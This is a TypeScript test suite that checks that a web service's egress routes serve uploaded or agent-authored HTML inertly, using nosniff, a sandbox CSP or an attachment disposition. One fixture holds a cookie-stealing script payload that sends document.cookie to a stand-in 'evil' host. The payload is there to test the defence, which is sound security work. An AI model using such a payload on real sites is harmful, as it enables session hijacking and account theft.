// Served-content inertness totality.
//
// Doctrine (CLAUDE.md, "Served CONTENT"): agent/uploader-authored egress is inert
// — never active script on the first-party origin. Every served egress path
// (/o/:path, /p/:path, /f/:id) derives its security headers from the ONE shared
// `inertHeaders` chokepoint in io.ts, so an attacker-chosen `text/html`/`svg`
// Content-Type can't run same-origin and steal the owner's `__session` cookie.
//
// This suite is the totality check for that boundary: it enumerates the served
// egress routes (a live domain, not a single hardcoded case) and asserts EVERY
// one neutralizes ACTIVE content (sandbox CSP and/or attachment) + nosniff. A NEW
// served path that emits active content un-neutralized FAILS THE BUILD here.

import { env, SELF } from "cloudflare:test";
import { describe, it, expect } from "vitest";
import type { HiveDO } from "../../entities/Hive/hive";
import { inertHeaders, ACTIVE_SERVED_MIME } from "../../shared/Routing/routes/io";

// These tests run without MNEMION_SECRET → dev mode, so `visibility: public`
// content serves unauthenticated and we can drive the real HTTP egress.

function ownerHive(): DurableObjectStub<HiveDO> {
  const id = env.MNEMION_HIVE.idFromName("user:owner");
  return env.MNEMION_HIVE.get(id);
}

// A response is inert iff it can't run active script on the first-party origin:
// either sandboxed (unique opaque origin) or forced to download — AND nosniff so
// the type can't be re-sniffed into HTML. Used as the single oracle below.
function assertInert(res: Response, label: string) {
  expect(res.headers.get("X-Content-Type-Options"), `${label}: nosniff`).toBe("nosniff");
  const csp = res.headers.get("Content-Security-Policy") || "";
  const disp = res.headers.get("Content-Disposition") || "";
  const sandboxed = csp.includes("sandbox");
  const attached = disp.includes("attachment");
  expect(sandboxed || attached, `${label}: must be sandboxed or attachment, got CSP="${csp}" Disposition="${disp}"`).toBe(true);
}

// === The enumerated egress domain ===
//
// Each descriptor knows how to (1) plant ACTIVE (text/html) content reachable at
// its public URL and (2) the URL to drive. The suite iterates this list — adding
// a served egress route means adding a descriptor (or it stays uncovered, which
// the standalone /f live-or-helper case below also guards).

type Egress = {
  name: string;
  // Returns the public path to fetch, after planting active content. Returns null
  // when the route can't be driven live in this runtime (e.g. /f needs R2).
  setup: (hive: DurableObjectStub<HiveDO>) => Promise<string | null>;
};

async function publicHtmlOutput(hive: DurableObjectStub<HiveDO>, path: string): Promise<string> {
  const r = JSON.parse(await hive.mutate("_outputs", "create", JSON.stringify({
    path,
    content: "<script>document.location='//evil/?'+document.cookie</script>",
    mime_type: "text/html",
    visibility: "public",
  })));
  if (r.error) throw new Error(`output create failed: ${r.message}`);
  return `/o/${path}`;
}

async function publicHtmlPublication(hive: DurableObjectStub<HiveDO>, path: string): Promise<string> {
  // A publication needs a user source pattern with an entry.
  const p = JSON.parse(await hive.proposeChange("Create", JSON.stringify({
    type: "create_pattern", pattern_name: "inert_notes", pattern_description: "t", doctrine: "t",
    facets: [{ name: "title", type: "text", required: true }],
  })));
  if (!p.error) await hive.applyChange(p.change_id); // tolerate already-exists across tests
  await hive.mutate("inert_notes", "create", JSON.stringify({ title: "hello" }));
  const pub = JSON.parse(await hive.mutate("_publications", "create", JSON.stringify({
    path, source_pattern: "inert_notes", format: "html", visibility: "public",
  })));
  if (pub.error) throw new Error(`publication create failed: ${pub.message}`);
  return `/p/${path}`;
}

const EGRESS_ROUTES: Egress[] = [
  {
    name: "/o/:path (agent egress)",
    setup: (hive) => publicHtmlOutput(hive, "inert-o"),
  },
  {
    name: "/p/:path (publication, text/html)",
    setup: (hive) => publicHtmlPublication(hive, "inert-p"),
  },
  {
    name: "/f/:id (document store)",
    // /f streams from R2, which vitest-pool-workers' isolatedStorage can't run.
    // When DOCUMENTS is absent (CI default) it returns 404, so it can't be driven
    // live here; the helper-level assertion below proves serveDocument's headers.
    setup: async () => (env as any).DOCUMENTS ? "/f/1" : null,
  },
];

describe("served-content inertness totality", () => {
  it("every enumerated served egress route neutralizes ACTIVE content", async () => {
    const hive = ownerHive();
    let driven = 0;
    for (const route of EGRESS_ROUTES) {
      const path = await route.setup(hive);
      if (path == null) continue; // not drivable in this runtime
      const res = await SELF.fetch(`https://test.local${path}`);
      expect(res.status, `${route.name}: served`).toBe(200);
      assertInert(res, route.name);
      driven++;
    }
    // At least the two R2-free egresses must have actually been exercised live —
    // guards against the loop silently skipping everything.
    expect(driven).toBeGreaterThanOrEqual(2);
  });

  // The chokepoint itself, exercised over its whole active-type domain. /f's live
  // hop can't run without R2, so this is the registry-driven oracle that every
  // active MIME (including what an uploader could pick for a document) is made
  // inert by the helper serveDocument routes through.
  it("inertHeaders neutralizes every ACTIVE MIME (egress + file-store policy)", () => {
    expect(ACTIVE_SERVED_MIME.size).toBeGreaterThan(0);
    for (const mime of ACTIVE_SERVED_MIME) {
      // Egress policy: sandboxed render.
      const egress = inertHeaders(mime);
      expect(egress.active, `${mime} classified active`).toBe(true);
      expect(egress.headers["X-Content-Type-Options"]).toBe("nosniff");
      expect(egress.headers["Content-Security-Policy"], `${mime} sandboxed`).toContain("sandbox");

      // File-store policy (/f): sandboxed AND forced to download.
      const file = inertHeaders(mime, { forceAttachment: true });
      expect(file.headers["Content-Security-Policy"]).toContain("sandbox");
      expect(file.headers["Content-Disposition"], `${mime} attachment`).toBe("attachment");
      expect(file.headers["X-Content-Type-Options"]).toBe("nosniff");
    }
  });

  it("inertHeaders keeps SAFE types inline + nosniff, and forces unknown → text/plain", () => {
    // Safe types serve as-is (no sandbox/attachment), but still nosniff.
    for (const safe of ["text/plain", "application/pdf", "image/png", "application/json; charset=utf-8"]) {
      const h = inertHeaders(safe);
      expect(h.active, `${safe} not active`).toBe(false);
      expect(h.contentType, `${safe} preserved`).toBe(safe);
      expect(h.headers["X-Content-Type-Options"]).toBe("nosniff");
      expect(h.headers["Content-Security-Policy"]).toBeUndefined();
    }
    // Unknown / missing → inert plain text.
    for (const unk of ["application/octet-stream", "", null, undefined, "weird/type"]) {
      const h = inertHeaders(unk as any);
      expect(h.contentType, `${String(unk)} → text/plain`).toBe("text/plain; charset=utf-8");
      expect(h.headers["X-Content-Type-Options"]).toBe("nosniff");
    }
  });
});
